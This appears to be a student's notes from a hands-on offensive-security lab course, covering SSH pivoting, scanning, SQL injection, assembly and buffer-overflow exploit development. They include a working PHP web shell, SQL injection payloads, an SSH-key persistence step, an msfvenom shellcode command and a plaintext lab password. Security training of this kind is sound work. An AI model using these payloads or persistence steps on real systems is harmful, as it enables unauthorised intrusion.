# Networking Module

## Day 1

### Links
  *  https://sec.cybbh.io/public/security/latest/index.html
  *  http://10.50.20.30:8000/challenges

### Ops Stations
 * Windows: ```10.50.24.165```
 * Linux: ```10.50.35.203```

### Stack Info
  *  Stack No. ```1```
  *  Username: ```NAAN-006-M```
  *  Password: ```0pnw1tLceqmGWTj```
  *  IP: ```10.50.36.164```

## "MAKE GOOD OPNOTES"

### New Tunneling Method

#### 1. Will setup connection to the jumpbox
 
 ```ssh -MS /tmp/jump student@10.50.36.164```


#### 2. Enumerate using Ruby Pingsweep
 
 ```for i in {1..254} ;do (ping -c 1 X.X.X.$i | grep "bytes from" &) ;done```


#### 3. Setup Proxychains from Lin-Ops
 
 ```ssh -S /tmp/jump jump -O forward -D 9050```

 * To Cancel Proxychain : replace forward before -D with ```cancel```

#### 4. Discover Open Ports on Hosts

 ```proxychains nmap -Pn X.X.X.X -T4 -n```


#### 5. Banner Grab Ports of Interest

 ```proxychains nc X.X.X.X (Port)```

#### 6. Local Port Forwards to Internal Web Servers and SSH Server

 ```ssh -S /tmp/jump jump -O forward -L2222:X.X.X.X:80 -L3333:X.X.X.X:2222```

#### 7. Connect on port 3333 to address specified in Forward

 * Connecting to SSH Server

 ```ssh -MS /tmp/t1 creds@127.0.0.1 -p 3333```

 * Connecting to Web Server

 ```ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222```

#### SCP

Remote -> Local
```
```
Local -> Remote
```scp -P 1234 inventory.exe comrade@127.0.0.1:.
```
<hr>

## Slide Notes

### XPATH HTML Scraper
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```
#### Uses Python to scrape webpage at domain for certain HTML element

### Nmap Scripting Engine
```proxychains nmap -T4 --script=banner=http-enum 192.168.28.100 -p80```

## Day 2

### Webdev stuff I learned back in HS, javascript, lookin in html, the works.

### Enumerate website

/uploads
/chat
/cmdinjection
/java
/path
/webexample
/cross
/

From surfing:
 * index.html
      Has styles in head, fileUpload.php button at the top and db_recover.php button at the bottom of the page.
      folders on interest
      /icons
      /uploads -->  Provides a shell

      ssh-keygen
      echo "your key" >> currentuser directory/.ssh/authorized keys
      check with ls -la and cat
      ### Allows for logging in without password

      uploading malicious php files will allow for launching a web shell
   
```
  <HTML>
  <BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```

# Day 3

   ## MYSQL

   
   ### Default Databases

   
   information_schema
  
   mysql
  
   performance_schema

   ### Commands


   #### Syntax

   
   Terminate each line w a semicolon
   
   select * from (DB) - gets data from db
   
   union - combine 2 or more select statements
   
   use - select a db
   
   update - updates a db

   show table - shows a table

   #### Examples
   
   ```select username,passwd,studentID from session.userinfo ;```

   ```select name,cost,color from session.car ;```

   ```UNION SELECT type,2,cost,color,year from session.car #```
   
   ```UNION SELECT carid,2,type,name,year from session.car #```

   #### Golden Statement:
   
   ```select table_schema,table_name,column_name from information_schema.columns ;```
   
   ```UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #```

   ## SQL Injection
   
   ![image](https://github.com/user-attachments/assets/88a665f1-ed46-4782-beff-a91ba3ed9357)


   Paste into both fields to find vulnerable input box
   ```' or 1='1```

   ![image](https://github.com/user-attachments/assets/68bd1ec1-e920-4b5d-8804-5f407acf589c)

   Inspect element and navigate to the Network tab, then click on the POST packet 

   ![image](https://github.com/user-attachments/assets/e58a3ded-9837-4e32-bd1a-554cf89207d6)


   ![image](https://github.com/user-attachments/assets/0b3ebd4c-d314-411e-9445-58e06c4b1d13)


   In the POST packet, look to the right and click raw to view the string to make your query

   ![image](https://github.com/user-attachments/assets/28c8ec91-2666-4dd7-9911-e2e5e5e7ec4a)

   UNION SELECT type,2,cost,color,year from session.car #
   UNION SELECT carid,2,type,name,year from session.car #
 #Place ? at end of (url).php to make it a query then add string, should return wanted info array

<hr>

## Day 4

### Reverse Engineering Day

### x86 Assembly

   #### 16 general purpose 64bit registers
   
   ```%rax``` First return register

   ```%rbx``` Second return register

   ```%rcx``` Third return register

   ```%rdx``` Fourth return register

   ```%rbp``` Base Pointer that stores location of the bottom on the stack
   
   ```%rsp``` Register that stores location of top of the stack

   ### Memory Structure

|HEAP|STACK|General Register|Control Register|Flags Register|
|:---:|:---:|:---:|:---:|:---:|
|Memory to be allocated and deallocated|Contiguous section of memory for passing arguments|Multipurpose register that can be used to store data/memory locations|Processor register changing CPU behavior|Stores state of CPU|

 * #### Memory Offset
|64bit|32bit|Lower 16 bits|Desc|
|:---:|:---:|:---:|:---:|
|RIP|EIP|IP|Instruction Pointer, holds address for next instruction|

 * #### Instruction Pointers

|MOV|PUSH|POP|INC|DEC|ADD|SUB|CMP|JMP|JLE|JE|
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
|Move src to dst|Push src onto stack, stack grows by 8 bytes|Pop top of stack to dst, stack shrinks by 8|Increment src by 1|Decrement src by 1|Add src to dst|Subtract src from dst|Compare 2 vals by subtracting them and setting %RFLAGS, ZeroFlag set means they are the same|Jump to location|Jump if Less or Equal|Jump if Equal|

Examples:
```
  1 main:
  2     mov rax, 16         //Move into rax, value of 16
  3     push rax        //Push rax (16) to top of the stack, stack will grow by 8 bytes
  4     jmp mem2    //Jump to memory location with function mem2
  5 
  6 mem1:
  7     mov rax, 8          //Move into rax, value of 8
  8     ret             //Will return contents of first return register
  9 
 10 mem2:
 11     pop r8              //Pop value at top of the stack (16) into r8
 12     cmp rax, r8     //Compare rax (16) to r8 (16) by subtracting then set ZeroFlag bc they are the same
 13     je mem1      //Jump to mem1 if ZeroFlag is set (it is) to equal
```
```
  1 main:
  2     mov rcx, 25         //Move value 35 into rcx
  3     mov rbx, 62      //Move value 62 into rbx
  4     jmp mem1      //Jump to memory location containing function mem1
  5 
  6 mem1:
  7     sub rbx, 40             //Subtract value of 40 from rbx, making rbx = 22
  8     mov rsi, rbx        //Move value of rbx into rsi, making rsi = 22
  9     cmp rcx, rsi     //Compare rsi (22) to rcx (25) Less than flag is set
 10     jle mem2       //Jump to memory location containing function mem2 if rsi (22) <= rcx (25)
 11 
 12 mem2:
 13     mov rax, 0      //Move value 0 into rax
 14     ret          //Return contents of first register, rax (0)
```

### Reverse Engineering Workflow (Software)
 * Static
 * Behavioral
 * Dynamic
 * Disassembly
 * Document Findings

# Day 5

### Exploit Engineering

get program and confirm whether it uses vulnerable assembly instruction (gets)

script will be edited as time goes on, start with something simple

```
#!/usr/bin/env python
buffer = "A" * 200
print(buffer)
```

run program through gbd with a script as an argument using run <<<$(script.py)

find code and copy the location it says and use it for offset

find offset value, https://wiremask.eu/tools/buffer-overflow-pattern-generator/

next run gdb without any plugins and unset COLUMNS & LINES, then run the program to confirm it crashes

map memory with ```info proc map```

look for jmp esp with 1st 4 locations, 1st location for heap and last for stack```find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4```

Use msfconsole, msfvenom, to make shellcode
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python

# Day 6

### Windows Exploitation Engineering

make script to connect to vuln server

use vulnerable commands ```trun /.:/```

use 5000 character string to crash program and find EIP in immunity db

use EIP to find offset and iterate a single character that many times

